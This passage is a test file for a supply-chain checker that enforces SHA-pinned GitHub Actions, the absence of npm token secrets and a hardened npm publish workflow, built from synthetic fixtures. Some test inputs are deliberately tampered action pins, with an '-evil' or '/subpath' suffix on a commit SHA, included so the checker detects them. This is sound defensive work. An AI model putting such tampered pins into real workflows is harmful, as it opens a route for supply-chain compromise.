import { describe, it, expect } from "vitest";
import {
  checkActionShaPins,
  checkCancellationCoverage,
  checkCiPackageScripts,
  checkNoTokenSecrets,
  checkSupplyChainInvariants,
} from "../../../scripts/check-supply-chain-invariants.mjs";
import { mkdtemp, mkdir, writeFile, rm } from "node:fs/promises";
import { join, resolve, dirname } from "node:path";
import { fileURLToPath } from "node:url";
import { tmpdir } from "node:os";

describe("checkActionShaPins", () => {
  it("passes when all uses are exact 40-char SHA pinned", () => {
    const content = [
      "jobs:",
      "  build:",
      "    steps:",
      "      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6.0.2",
      "      - uses: actions/setup-node@820762786026740c76f36085b0efc47a31fe5020 # v7.0.0",
    ].join("\n");
    expect(checkActionShaPins(content)).toEqual([]);
  });

  it("fails when a uses references a tag", () => {
    const content = [
      "jobs:",
      "  build:",
      "    steps:",
      "      - uses: actions/checkout@v6.0.2",
    ].join("\n");
    const violations = checkActionShaPins(content);
    expect(violations.length).toBe(1);
    expect(violations[0]).toContain("40-char commit SHA");
  });

  it("fails when a uses references main", () => {
    const content = [
      "jobs:",
      "  build:",
      "    steps:",
      "      - uses: actions/checkout@main",
    ].join("\n");
    const violations = checkActionShaPins(content);
    expect(violations.length).toBe(1);
  });

  it("fails when SHA has -evil suffix", () => {
    const content = [
      "jobs:",
      "  build:",
      "    steps:",
      "      - uses: actions/checkout@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa-evil",
    ].join("\n");
    const violations = checkActionShaPins(content);
    expect(violations.length).toBe(1);
    expect(violations[0]).toContain("40-char commit SHA");
  });

  it("fails when SHA has /subpath suffix", () => {
    const content = [
      "jobs:",
      "  build:",
      "    steps:",
      "      - uses: actions/checkout@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa/subpath",
    ].join("\n");
    const violations = checkActionShaPins(content);
    expect(violations.length).toBe(1);
  });

  it("passes for local action references (./)", () => {
    const content = [
      "jobs:",
      "  build:",
      "    steps:",
      "      - uses: ./local-action",
    ].join("\n");
    expect(checkActionShaPins(content)).toEqual([]);
  });
});

describe("checkNoTokenSecrets", () => {
  it("passes when no token secrets are referenced", () => {
    expect(checkNoTokenSecrets("run: npm publish")).toEqual([]);
  });

  it("fails when NPM_TOKEN is referenced", () => {
    const violations = checkNoTokenSecrets(
      "env:\n  NPM_TOKEN: ${{ secrets.NPM_TOKEN }}",
    );
    expect(violations.length).toBe(1);
    expect(violations[0]).toContain("NPM_TOKEN");
  });

  it("fails when NODE_AUTH_TOKEN is referenced", () => {
    const violations = checkNoTokenSecrets(
      "env:\n  NODE_AUTH_TOKEN: ${{ secrets.NODE_AUTH_TOKEN }}",
    );
    expect(violations.length).toBe(1);
    expect(violations[0]).toContain("NODE_AUTH_TOKEN");
  });
});

describe("checkSupplyChainInvariants — against the real repo", () => {
  it("reports no failures", () => {
    const repoRoot = resolve(
      dirname(fileURLToPath(import.meta.url)),
      "..",
      "..",
      "..",
    );
    const { failures } = checkSupplyChainInvariants(repoRoot);
    expect(failures).toBe(0);
  });
});

describe("checkSupplyChainInvariants — synthetic tree", () => {
  let root: string | undefined;

  // This fixture mirrors the real .github/workflows/publish.yml structure.
  // Run script hashes are pinned by the checker, so the run: blocks must
  // match the real workflow exactly.
  const wellFormedPublish = [
    "name: Publish",
    "",
    "on:",
    "  push:",
    "    tags:",
    "      - 'v*'",
    "",
    "permissions: {}",
    "",
    "concurrency:",
    "  group: npm-publish-${{ github.ref }}",
    "  cancel-in-progress: false",
    "",
    "jobs:",
    "  prepare:",
    "    runs-on: ubuntu-latest",
    "    permissions:",
    "      contents: read",
    "      actions: read",
    "    timeout-minutes: 15",
    "    steps:",
    "      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6.0.2",
    "        with:",
    "          persist-credentials: false",
    "      - name: Verify npm Trusted Publishing prerequisites",
    "        run: |",
    "          node --version",
    "          # Prefixing the validator with an inline assignment would hand the",
    "          # shell the validator's exit status instead of the version command's,",
    "          # so an npm that prints a supported version and then fails would pass",
    "          # as a verified toolchain. The process is checked first; only then is",
    "          # its output read.",
    "          if npm_version=\"$(npm --version)\"",
    "          then",
    "            :",
    "          else",
    "            npm_version_exit=$?",
    "            echo \"::error::npm --version failed with exit ${npm_version_exit}. Refusing to continue with an unverified npm toolchain.\"",
    "            exit 1",
    "          fi",
    "",
    "          printf '%s\\n' \"$npm_version\"",
    "",
    "          NPM_VERSION=\"$npm_version\" node <<'NODE'",
    "          // Bounded on both sides. The lower bound is Trusted Publishing; the",
    "          // upper bound is `npm pack --json`, whose container shape changed",
    "          // between npm 11 and npm 12. scripts/npm-pack-json.mjs reads exactly",
    "          // those two measured shapes, so admitting an unmeasured major would",
    "          // put this job back where it was: a gate wider than its parser,",
    "          // failing after the tag is already pushed. A new major is unlocked by",
    "          // a PR that measures its payload and covers it there.",
    "          const raw = process.env.NPM_VERSION ?? \"\";",
    "          const match = /^(\\d+)\\.(\\d+)\\.(\\d+)$/.exec(raw);",
    "",
    "          if (!match) {",
    "            console.error(",
    "              `npm version must be a stable x.y.z value, got ${JSON.stringify(raw)}`,",
    "            );",
    "            process.exit(1);",
    "          }",
    "",
    "          const major = Number(match[1]);",
    "          const minor = Number(match[2]);",
    "          const patch = Number(match[3]);",
    "",
    "          const supported =",
    "            (major === 11 && (minor > 5 || (minor === 5 && patch >= 1))) ||",
    "            major === 12;",
    "",
    "          if (!supported) {",
    "            console.error(",
    "              `This release workflow supports npm 11.5.1 through npm 12.x; got ${raw}`,",
    "            );",
    "            process.exit(1);",
    "          }",
    "          NODE",
    "      - run: node scripts/check-required-ci-for-sha.mjs --json",
    "      - run: pnpm check:release-version",
    "      - name: Build the distribution",
    "        run: |",
    "          pnpm build",
    "      - run: node scripts/assert-package-metadata.mjs",
    "      - name: Build and inspect exact package tarball",
    "        run: |",
    "          npm pack --json --ignore-scripts > pack.json",
    "          node scripts/check-package-tarball.mjs --pack-json pack.json",
    "      - uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4.6.2",
    "        with:",
    "          name: release-artifact",
    "          path: release-artifact/",
    "          retention-days: 7",
    "",
    "  publish:",
    "    name: Publish to npm via Trusted Publishing",
    "    runs-on: ubuntu-latest",
    "    needs: prepare",
    "    environment: npm-publish",
    "    permissions:",
    "      contents: read",
    "      id-token: write",
    "    timeout-minutes: 5",
    "    steps:",
    "      - name: Download release artifact",
    "        uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1",
    "        with:",
    "          name: release-artifact",
    "          path: release-artifact",
    "      - name: Set up Node",
    "        uses: actions/setup-node@820762786026740c76f36085b0efc47a31fe5020 # v7.0.0",
    "        with:",
    "          node-version: 24",
    "          package-manager-cache: false",
    "      - name: Verify manifest and publish",
    "        id: publish",
    "        env:",
    "          EXPECTED_TAG: ${{ github.ref_name }}",
    "          EXPECTED_COMMIT: ${{ github.sha }}",
    "          NPM_CONFIG_PROVENANCE: 'true'",
    "          NPM_REGISTRY: https://registry.npmjs.org",
    "        run: |",
    "          manifest=\"release-artifact/release-manifest.json\"",
    "          tarball=\"release-artifact/package.tgz\"",
    "",
    "          # This job has no checkout by design — it holds id-token: write, so it",
    "          # runs no repository code. Everything it needs is either downloaded",
    "          # artifact or inline. It is also a fresh runner, so the prepare job's",
    "          # toolchain check proves nothing about this one; npm is re-checked",
    "          # here before anything reaches the registry.",
    "          # Prefixing the validator with an inline assignment would hand the",
    "          # shell the validator's exit status instead of the version command's,",
    "          # so an npm that prints a supported version and then fails would pass",
    "          # as a verified toolchain. The process is checked first; only then is",
    "          # its output read.",
    "          if npm_version=\"$(npm --version)\"",
    "          then",
    "            :",
    "          else",
    "            npm_version_exit=$?",
    "            echo \"::error::npm --version failed with exit ${npm_version_exit}. Refusing to continue with an unverified npm toolchain.\"",
    "            exit 1",
    "          fi",
    "",
    "          printf '%s\\n' \"$npm_version\"",
    "",
    "          NPM_VERSION=\"$npm_version\" node <<'NPM_VERSION_NODE'",
    "          const raw = process.env.NPM_VERSION ?? \"\";",
    "          const match = /^(\\d+)\\.(\\d+)\\.(\\d+)$/.exec(raw);",
    "",
    "          if (!match) {",
    "            console.error(",
    "              `npm version must be a stable x.y.z value, got ${JSON.stringify(raw)}`,",
    "            );",
    "            process.exit(1);",
    "          }",
    "",
    "          const major = Number(match[1]);",
    "          const minor = Number(match[2]);",
    "          const patch = Number(match[3]);",
    "",
    "          const supported =",
    "            (major === 11 && (minor > 5 || (minor === 5 && patch >= 1))) ||",
    "            major === 12;",
    "",
    "          if (!supported) {",
    "            console.error(",
    "              `This release workflow supports npm 11.5.1 through npm 12.x; got ${raw}`,",
    "            );",
    "            process.exit(1);",
    "          }",
    "          NPM_VERSION_NODE",
    "",
    "          MANIFEST=\"$manifest\" \\",
    "          TARBALL=\"$tarball\" \\",
    "          node <<'NODE'",
    "          const fs = require(\"fs\");",
    "          const crypto = require(\"crypto\");",
    "",
    "          const m = JSON.parse(fs.readFileSync(process.env.MANIFEST, \"utf8\"));",
    "",
    "          if (m.package !== \"code-pact\") {",
    "            throw new Error(`unexpected package: ${JSON.stringify(m.package)}`);",
    "          }",
    "",
    "          const match = /^v(\\d+\\.\\d+\\.\\d+(?:-(?:alpha|beta|rc)\\.\\d+)?)$/.exec(process.env.EXPECTED_TAG ?? \"\");",
    "",
    "          if (!match) {",
    "            throw new Error(`unexpected workflow tag: ${JSON.stringify(process.env.EXPECTED_TAG)}`);",
    "          }",
    "",
    "          const expectedVersion = match[1];",
    "",
    "          if (m.tag !== process.env.EXPECTED_TAG) {",
    "            throw new Error(`manifest tag ${JSON.stringify(m.tag)} != workflow tag ${JSON.stringify(process.env.EXPECTED_TAG)}`);",
    "          }",
    "",
    "          if (m.version !== expectedVersion) {",
    "            throw new Error(`manifest version ${JSON.stringify(m.version)} != workflow version ${JSON.stringify(expectedVersion)}`);",
    "          }",
    "",
    "          if (m.commit !== process.env.EXPECTED_COMMIT) {",
    "            throw new Error(`manifest commit ${JSON.stringify(m.commit)} != workflow commit ${JSON.stringify(process.env.EXPECTED_COMMIT)}`);",
    "          }",
    "",
    "          if (!/^[0-9a-f]{64}$/.test(m.tarball_sha256)) {",
    "            throw new Error(\"manifest tarball_sha256 is invalid\");",
    "          }",
    "",
    "          const bytes = fs.readFileSync(process.env.TARBALL);",
    "          const actual = crypto.createHash(\"sha256\").update(bytes).digest(\"hex\");",
    "",
    "          if (actual !== m.tarball_sha256) {",
    "            throw new Error(`tarball SHA-256 ${actual} != manifest ${m.tarball_sha256}`);",
    "          }",
    "          NODE",
    "",
    "          version=\"$(node -p 'require(\"./release-artifact/release-manifest.json\").version')\"",
    "          registry=\"$NPM_REGISTRY\"",
    "",
    "          # Inline rather than a repository file: there is no checkout here, so",
    "          # no repository path resolves.",
    "          #",
    "          # The probe reports on two channels, deliberately kept apart. Process",
    "          # success means \"the probe ran to completion\"; stdout carries the",
    "          # registry state. Node exits 1 for a syntax error, an uncaught",
    "          # exception, and a missing module alike, so an exit code that also",
    "          # encodes \"absent\" cannot tell a proven absence from a broken probe —",
    "          # and it is the broken probe that would publish.",
    "          if probe_state=\"$(",
    "            PACKAGE_NAME=\"code-pact\" PACKAGE_VERSION=\"$version\" node <<'NPM_AVAILABILITY_NODE'",
    "          (async () => {",
    "            const packageName = process.env.PACKAGE_NAME;",
    "            const version = process.env.PACKAGE_VERSION;",
    "            const registry = process.env.NPM_REGISTRY;",
    "",
    "            if (",
    "              typeof packageName !== \"string\" ||",
    "              packageName === \"\" ||",
    "              typeof version !== \"string\" ||",
    "              version === \"\" ||",
    "              registry !== \"https://registry.npmjs.org\"",
    "            ) {",
    "              throw new Error(\"invalid npm availability probe input\");",
    "            }",
    "",
    "            const target = `${registry}/${packageName.replace(/\\//g, \"%2F\")}/${encodeURIComponent(version)}`;",
    "",
    "            const response = await fetch(target, {",
    "              headers: { accept: \"application/json\" },",
    "              signal: AbortSignal.timeout(10000),",
    "            });",
    "",
    "            if (response.status === 200) {",
    "              process.stdout.write(\"exists\\n\");",
    "              return;",
    "            }",
    "",
    "            if (response.status === 404) {",
    "              process.stdout.write(\"absent\\n\");",
    "              return;",
    "            }",
    "",
    "            throw new Error(",
    "              `npm registry returned unexpected status ${response.status}`,",
    "            );",
    "          })().catch(error => {",
    "            console.error(`npm registry probe failed: ${error.message}`);",
    "            process.exitCode = 2;",
    "          });",
    "          NPM_AVAILABILITY_NODE",
    "          )\"",
    "          then",
    "            :",
    "          else",
    "            probe_exit=$?",
    "            echo \"::error::Registry probe process failed with exit ${probe_exit}. Refusing to publish because the existing-version check could not be completed.\"",
    "            exit 1",
    "          fi",
    "",
    "          case \"$probe_state\" in",
    "            exists)",
    "              echo \"::error::Version code-pact@${version} already exists in the registry. A tag/version collision is not a successful release.\"",
    "              exit 1",
    "              ;;",
    "            absent)",
    "              ;;",
    "            *)",
    "              echo \"::error::Registry probe returned an unrecognized state: ${probe_state}\"",
    "              exit 1",
    "              ;;",
    "          esac",
    "",
    "          npm publish \"./$tarball\" --ignore-scripts --registry=\"$registry\"",
    "",
    "",
    "",
    "",
    "",
    "  verify:",
    "    runs-on: ubuntu-latest",
    "    needs: [publish, prepare]",
    "    permissions:",
    "      contents: read",
    "    timeout-minutes: 10",
    "    outputs:",
    "      shasum: ${{ steps.integrity.outputs.shasum }}",
    "      integrity: ${{ steps.integrity.outputs.integrity }}",
    "      local_sha256: ${{ steps.integrity.outputs.local_sha256 }}",
    "    steps:",
    "      - name: Checkout release tag",
    "        uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6.0.2",
    "        with:",
    "          fetch-depth: 1",
    "          persist-credentials: false",
    "      - name: Download release artifact",
    "        uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1",
    "        with:",
    "          name: release-artifact",
    "          path: release-artifact",
    "      - name: Set up Node",
    "        uses: actions/setup-node@820762786026740c76f36085b0efc47a31fe5020 # v7.0.0",
    "        with:",
    "          node-version: 24",
    "      - name: Verify registry tarball",
    "        run: node scripts/verify-published-tarball.mjs",
    "      - name: Upload integrity artifact",
    "        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1",
    "        with:",
    "          name: release-integrity",
    "          path: release-integrity.json",
    "          retention-days: 7",
    "",
    "  provenance:",
    "    name: Verify npm provenance attestation",
    "    runs-on: ubuntu-latest",
    "    needs: [publish, prepare, verify]",
    "    permissions:",
    "      contents: read",
    "    timeout-minutes: 10",
    "    steps:",
    "      - name: Checkout release tag",
    "        uses: actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0 # v7.0.0",
    "        with:",
    "          fetch-depth: 1",
    "          persist-credentials: false",
    "      - name: Download release artifact",
    "        uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1",
    "        with:",
    "          name: release-artifact",
    "          path: release-artifact",
    "      - name: Set up Node",
    "        uses: actions/setup-node@820762786026740c76f36085b0efc47a31fe5020 # v7.0.0",
    "        with:",
    "          node-version: 24",
    "      - name: Verify provenance attestation",
    "        run: |",
    '          version="$(node -p \'require("./release-artifact/release-manifest.json").version\')"',
    "",
    "          node \\",
    "            scripts/verify-published-provenance.mjs \\",
    "            --package code-pact \\",
    '            --version "$version" \\',
    "            --json",
    "",
    "  github-release:",
    "    name: Create verified GitHub Release",
    "    runs-on: ubuntu-latest",
    "    needs: [verify, provenance, prepare, publish]",
    "    permissions:",
    "      contents: write",
    "    timeout-minutes: 5",
    "    steps:",
    "      - name: Download release artifact",
    "        uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1",
    "        with:",
    "          name: release-artifact",
    "          path: release-artifact",
    "      - name: Download integrity artifact",
    "        uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1",
    "        with:",
    "          name: release-integrity",
    "          path: release-integrity",
    "      - name: Create or reconcile GitHub Release",
    "        env:",
    "          GH_TOKEN: ${{ github.token }}",
    "          GH_REPO: ${{ github.repository }}",
    "          TAG: ${{ github.ref_name }}",
    "        run: |",
    '          version="$(node -p \'require("./release-artifact/release-manifest.json").version\')"',
    '          shasum="$(node -p \'require("./release-integrity/release-integrity.json").shasum\')"',
    '          integrity="$(node -p \'require("./release-integrity/release-integrity.json").integrity\')"',
    '          local_sha256="$(node -p \'require("./release-integrity/release-integrity.json").local_sha256\')"',
    "",
    '          provenance_note="generated through Trusted Publishing"',
    "",
    "          cat release-artifact/release-notes.md > final-notes.md",
    "          cat >> final-notes.md <<EOF",
    "",
    "          ## Integrity",
    "",
    "          - npm shasum: \\`$shasum\\`",
    "          - npm integrity: \\`$integrity\\`",
    "          - local tarball SHA-256: \\`$local_sha256\\`",
    "          - npm provenance: $provenance_note",
    "          EOF",
    "",
    '          if gh release view "$TAG" >/dev/null 2>&1',
    "          then",
    "            gh release edit \\",
    '              "$TAG" \\',
    "              --notes-file final-notes.md \\",
    "              --verify-tag",
    "          else",
    "            gh release create \\",
    '              "$TAG" \\',
    '              --title "$TAG" \\',
    "              --notes-file final-notes.md \\",
    "              --verify-tag",
    "          fi",
  ].join("\n");

  const wellFormedCi = [
    "name: CI",
    "",
    "on:",
    "  push:",
    "    branches: [main]",
    "  pull_request:",
    "",
    "permissions:",
    "  contents: read",
    "",
    "concurrency:",
    "  group: ci-${{ github.event.pull_request.number || github.ref }}",
    "  cancel-in-progress: ${{ github.event_name == 'pull_request' }}",
    "",
    "jobs:",
    "  classify:",
    "    name: Classify change scope",
    "    runs-on: ubuntu-latest",
    "    outputs:",
    "      docs: ${{ steps.classify.outputs.docs }}",
    "      standard: ${{ steps.classify.outputs.standard }}",
    "    steps:",
    "      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6.0.2",
    "        with:",
    "          fetch-depth: 0",
    "          persist-credentials: false",
    "      - name: Determine base ref",
    "        id: base",
    "        run: |",
    '          if [ "$GITHUB_EVENT_NAME" = "pull_request" ]; then',
    '            echo "ref=${{ github.event.pull_request.base.sha }}" >> "$GITHUB_OUTPUT"',
    "          else",
    '            echo "ref=${{ github.event.before }}" >> "$GITHUB_OUTPUT"',
    "          fi",
    "      - name: Classify changed files",
    "        id: classify",
    "        env:",
    "          BASE_REF: ${{ steps.base.outputs.ref }}",
    "        run: |",
    '          trusted_classifier="$RUNNER_TEMP/verification-scope.mjs"',
    '          if git cat-file -e "$BASE_REF:scripts/verification-scope.mjs" 2>/dev/null; then',
    '            git show "$BASE_REF:scripts/verification-scope.mjs" > "$trusted_classifier"',
    '            node "$trusted_classifier" --base "$BASE_REF" --format github',
    "          else",
    '            echo "docs=true" >> "$GITHUB_OUTPUT"',
    '            echo "standard=true" >> "$GITHUB_OUTPUT"',
    "          fi",
    "",
    "  docs:",
    "    name: Docs checks",
    "    runs-on: ubuntu-latest",
    "    needs: [classify]",
    "    if: needs.classify.outputs.docs == 'true'",
    "    steps:",
    "      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6.0.2",
    "        with:",
    "          persist-credentials: false",
    "      - uses: pnpm/action-setup@0ebf47130e4866e96fce0953f49152a61190b271 # v6.0.9",
    "      - uses: actions/setup-node@820762786026740c76f36085b0efc47a31fe5020 # v7.0.0",
    "        with:",
    "          node-version: 22",
    "          cache: pnpm",
    "      - run: pnpm install --frozen-lockfile",
    "      - run: pnpm check:docs",
    "",
    "  standard:",
    "    name: Standard gate (Node 22)",
    "    runs-on: ubuntu-latest",
    "    needs: [classify]",
    "    if: needs.classify.outputs.standard == 'true'",
    "    steps:",
    "      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6.0.2",
    "        with:",
    "          persist-credentials: false",
    "      - uses: pnpm/action-setup@0ebf47130e4866e96fce0953f49152a61190b271 # v6.0.9",
    "      - uses: actions/setup-node@820762786026740c76f36085b0efc47a31fe5020 # v7.0.0",
    "        with:",
    "          node-version: 22",
    "          cache: pnpm",
    "      - run: pnpm install --frozen-lockfile",
    "      - run: pnpm test:ci",
    "      - run: pnpm check:fs-containment",
    "      - run: pnpm check:security-hardening",
    "",
    "  ci-status:",
    "    name: CI status",
    "    runs-on: ubuntu-latest",
    "    needs: [classify, docs, standard]",
    "    if: ${{ always() }}",
    "    steps:",
    "      - name: Verify CI results",
    "        env:",
    "          DOCS_OUTPUT: ${{ needs.classify.outputs.docs }}",
    "          STANDARD_OUTPUT: ${{ needs.classify.outputs.standard }}",
    "          CLASSIFY_RESULT: ${{ needs.classify.result }}",
    "          DOCS_RESULT: ${{ needs.docs.result }}",
    "          STANDARD_RESULT: ${{ needs.standard.result }}",
    "        run: |",
    '          if [ "$DOCS_OUTPUT" != "true" ] && [ "$DOCS_OUTPUT" != "false" ]; then',
    "            echo \"classify output docs is not a boolean: '$DOCS_OUTPUT'\"",
    "            exit 1",
    "          fi",
    '          if [ "$STANDARD_OUTPUT" != "true" ] && [ "$STANDARD_OUTPUT" != "false" ]; then',
    "            echo \"classify output standard is not a boolean: '$STANDARD_OUTPUT'\"",
    "            exit 1",
    "          fi",
    '          if [ "$CLASSIFY_RESULT" != "success" ]; then',
    '            echo "classify job did not succeed"',
    "            exit 1",
    "          fi",
    '          if [ "$DOCS_OUTPUT" = "true" ] && [ "$DOCS_RESULT" != "success" ]; then',
    "            exit 1",
    "          fi",
    '          if [ "$STANDARD_OUTPUT" = "true" ] && [ "$STANDARD_RESULT" != "success" ]; then',
    "            exit 1",
    "          fi",
  ].join("\n");

  const wellFormedCiDeep = [
    "name: Deep CI",
    "",
    "on:",
    "  workflow_dispatch:",
    "    inputs:",
    "      scope:",
    '        description: "Scope to run"',
    "        required: true",
    '        default: "linux-deep"',
    "        type: choice",
    "        options:",
    '          - "linux-deep"',
    '          - "node24"',
    '          - "windows"',
    '          - "all"',
    "",
    "permissions:",
    "  contents: read",
    "",
    "jobs:",
    "  linux-deep:",
    "    name: Linux deep gate (Node 22)",
    "    runs-on: ubuntu-latest",
    "    if: github.event.inputs.scope == 'all' || github.event.inputs.scope == 'linux-deep'",
    "    steps:",
    "      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6.0.2",
    "        with:",
    "          persist-credentials: false",
    "      - uses: pnpm/action-setup@0ebf47130e4866e96fce0953f49152a61190b271 # v6.0.9",
    "      - uses: actions/setup-node@820762786026740c76f36085b0efc47a31fe5020 # v7.0.0",
    "        with:",
    "          node-version: 22",
    "          cache: pnpm",
    "      - run: pnpm install --frozen-lockfile",
    "      - run: pnpm test:ci:deep",
    "",
    "  node-24-smoke:",
    "    name: Node 24 compatibility smoke",
    "    runs-on: ubuntu-latest",
    "    if: github.event.inputs.scope == 'all' || github.event.inputs.scope == 'node24'",
    "    steps:",
    "      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6.0.2",
    "        with:",
    "          persist-credentials: false",
    "      - uses: pnpm/action-setup@0ebf47130e4866e96fce0953f49152a61190b271 # v6.0.9",
    "      - uses: actions/setup-node@820762786026740c76f36085b0efc47a31fe5020 # v7.0.0",
    "        with:",
    "          node-version: 24",
    "          cache: pnpm",
    "      - run: pnpm install --frozen-lockfile",
    "      - run: pnpm typecheck",
    "      - run: pnpm test:unit",
    "      - run: pnpm build",
    "      - run: node dist/cli.js --version",
    "      - run: node dist/cli.js --json --version",
    "",
    "  windows-process-control:",
    "    name: Windows process-control (Node 22)",
    "    runs-on: windows-latest",
    "    if: github.event.inputs.scope == 'all' || github.event.inputs.scope == 'windows'",
    "    steps:",
    "      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6.0.2",
    "        with:",
    "          persist-credentials: false",
    "      - uses: pnpm/action-setup@0ebf47130e4866e96fce0953f49152a61190b271 # v6.0.9",
    "      - uses: actions/setup-node@820762786026740c76f36085b0efc47a31fe5020 # v7.0.0",
    "        with:",
    "          node-version: 22",
    "          cache: pnpm",
    "      - run: pnpm install --frozen-lockfile",
    "",
    "      - run: pnpm check:toolchain-binaries",
    "      - run: pnpm typecheck",
    "      - run: pnpm build",
    "      - run: pnpm exec vitest run tests/unit/core/project-fs-authority-resolvers.test.ts tests/unit/commands/verify-process.test.ts",
    "      - run: pnpm exec vitest run --config vitest.integration.config.ts tests/integration/verify-timeout-abort.test.ts",
    "",
    "  deep-ci-status:",
    "    name: Deep CI status",
    "    runs-on: ubuntu-latest",
    "    needs: [linux-deep, node-24-smoke, windows-process-control]",
    "    if: ${{ always() }}",
    "    steps:",
    "      - name: Verify deep CI succeeded",
    "        env:",
    "          SCOPE: ${{ github.event.inputs.scope }}",
    "          LINUX_RESULT: ${{ needs.linux-deep.result }}",
    "          NODE24_RESULT: ${{ needs.node-24-smoke.result }}",
    "          WINDOWS_RESULT: ${{ needs.windows-process-control.result }}",
    "        run: |",
    '          case "$SCOPE" in',
    "            all|linux-deep|node24|windows) ;;",
    "            *)",
    '              echo "invalid deep CI scope: $SCOPE"',
    "              exit 1",
    "              ;;",
    "          esac",
    "          ok=true",
    '          if [ "$SCOPE" = "all" ] || [ "$SCOPE" = "linux-deep" ]; then',
    '            if [ "$LINUX_RESULT" != "success" ]; then',
    "              ok=false",
    "            fi",
    "          fi",
    '          if [ "$SCOPE" = "all" ] || [ "$SCOPE" = "node24" ]; then',
    '            if [ "$NODE24_RESULT" != "success" ]; then',
    "              ok=false",
    "            fi",
    "          fi",
    '          if [ "$SCOPE" = "all" ] || [ "$SCOPE" = "windows" ]; then',
    '            if [ "$WINDOWS_RESULT" != "success" ]; then',
    "              ok=false",
    "            fi",
    "          fi",
    '          if [ "$ok" != "true" ]; then',
    "            exit 1",
    "          fi",
  ].join("\n");

  const wellFormedVerifyTimeoutAbort = [
    'import { runBoundedCommand } from "../../src/core/process/bounded-command.ts";',
    "",
    'describe.runIf(process.platform === "win32")("Windows bounded-command cancellation contract", () => {',
    '  it("times out a command tree through taskkill cleanup", async () => {',
    '    const result = await runBoundedCommand("node long-parent.mjs", dir, 750);',
    "    expect(result).toMatchObject({",
    "      timedOut: true,",
    '      termination: { strategy: "taskkill" },',
    "    });",
    "  });",
    '  it("aborts a command tree through taskkill cleanup", async () => {',
    '    const result = await runBoundedCommand("node long-parent.mjs", dir, 10_000, signal);',
    "    expect(result).toMatchObject({",
    "      aborted: true,",
    '      termination: { strategy: "taskkill" },',
    "    });",
    "  });",
    "});",
    "",
    'if (process.platform !== "win32") {',
    '  describe("CLI cancellation contract", () => {',
    '    it.each(["SIGINT", "SIGTERM"] as const)(',
    '      "cancels task complete on %s, removes descendants, and records no event",',
    "      async () => {",
    '        expect(JSON.parse(result.stdout)).toMatchObject({ error: { cause_code: "ABORTED" } });',
    "        expect((await loadMergedProgress(dir)).log.events).toHaveLength(0);",
    "      },",
    "    );",
    "  });",
    "}",
  ].join("\n");

  const wellFormedPackage = JSON.stringify(
    {
      packageManager: "pnpm@10.34.2",
      scripts: {
        test: "pnpm test:unit && pnpm test:integration",
        "test:integration": "pnpm test:integration:full",
        "test:integration:full":
          "pnpm build && vitest run --config vitest.integration.config.ts",
        "verify:base":
          "pnpm check:supply-chain && pnpm typecheck && pnpm test:unit && pnpm build",
        "verify:smoke":
          "pnpm test:integration:smoke && node dist/cli.js --version && node dist/cli.js --json --version",
        "verify:deep:extra":
          "pnpm check:docs && pnpm check:fs-containment && pnpm check:fs-authority && pnpm check:security-hardening && vitest run --config vitest.integration.config.ts && node dist/cli.js plan lint --include-quality --strict --json && node dist/cli.js plan analyze --strict --json && pnpm test:cli:init-smoke",
        "test:ci": "pnpm verify:base && pnpm verify:smoke",
        "test:ci:deep": "pnpm verify:base && pnpm verify:deep:extra",
        "verify:local": "node scripts/verification-scope.mjs --local --run",
        "prepush:fast": "pnpm verify:local",
        "release:check":
          "pnpm typecheck && pnpm test && pnpm check:docs && pnpm check:fs-containment && pnpm check:fs-authority && pnpm check:security-hardening && pnpm check:supply-chain && pnpm check:release-version && node dist/cli.js validate --json && node dist/cli.js plan lint --include-quality --strict --json && node dist/cli.js plan analyze --strict --json",
      },
      devDependencies: {
        esbuild: "0.28.1",
        vite: "^8.1.4",
      },
    },
    null,
    2,
  );

  const wellFormedWorkspace = [
    "packages:",
    '  - "."',
    "overrides:",
    "  esbuild: 0.28.1",
    "allowBuilds:",
    "  esbuild: false",
  ].join("\n");

  const wellFormedLock = [
    "lockfileVersion: '9.0'",
    "importers:",
    "  .:",
    "    devDependencies:",
    "      esbuild:",
    "        specifier: 0.28.1",
    "        version: 0.28.1",
    "      vite:",
    "        specifier: ^8.1.4",
    "        version: 8.1.4",
    "packages:",
    "  esbuild@0.28.1: {}",
    "  vite@8.1.4: {}",
    "snapshots:",
    "  esbuild@0.28.1: {}",
    "  vite@8.1.4: {}",
  ].join("\n");

  async function buildTree(
    overrides: {
      publishContent?: string;
      ciContent?: string;
      ciDeepContent?: string;
      securityContent?: string;
      packageContent?: string;
      workspaceContent?: string;
      lockContent?: string;
      verifyTimeoutAbortContent?: string;
    } = {},
  ): Promise<string> {
    const dir = await mkdtemp(join(tmpdir(), "sci-"));
    await mkdir(join(dir, ".github", "workflows"), { recursive: true });
    await mkdir(join(dir, "tests", "integration"), { recursive: true });
    await writeFile(
      join(dir, ".github", "workflows", "publish.yml"),
      overrides.publishContent ?? wellFormedPublish,
    );
    await writeFile(
      join(dir, ".github", "workflows", "ci.yml"),
      overrides.ciContent ?? wellFormedCi,
    );
    await writeFile(
      join(dir, ".github", "workflows", "ci-deep.yml"),
      overrides.ciDeepContent ?? wellFormedCiDeep,
    );
    await writeFile(
